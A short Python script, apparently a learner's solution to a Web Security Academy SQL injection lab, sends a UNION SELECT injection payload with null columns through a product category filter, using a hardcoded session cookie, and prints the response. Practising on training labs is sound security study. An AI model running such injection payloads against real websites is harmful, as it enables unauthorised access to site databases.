import requests

url = "https://0a57002d0324b68c80551c0400fa006c.web-security-academy.net/filter?category=Corporate+gifts"
payload = "' union select null, null, null--"
headers = {
    "Cookie": "Z1rPfgMpksacFX91FHT92YC7ir52LG3F"
}

res = requests.get(url + payload, headers=headers)

print(res.status_code)
print(res.text)